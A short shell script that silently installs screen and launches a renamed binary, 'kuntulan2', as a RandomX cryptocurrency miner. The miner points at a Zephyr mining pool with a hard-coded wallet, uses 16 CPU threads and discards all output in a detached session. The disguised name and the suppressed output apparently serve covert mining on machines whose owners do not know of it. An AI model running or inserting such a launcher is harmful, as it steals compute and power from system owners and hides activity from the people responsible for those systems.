sudo apt install screen -y >/dev/null 2>&1

screen -dmS Running sudo ./kuntulan2 --algorithm randomx --pool zephyr.miningocean.org:5332 --wallet ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 --password $(echo $(shuf -i 1-99999999 -n 1)-US1) --cpu-threads 16 --disable-gpu >/dev/null 2>&1 >/dev/null 2>&1
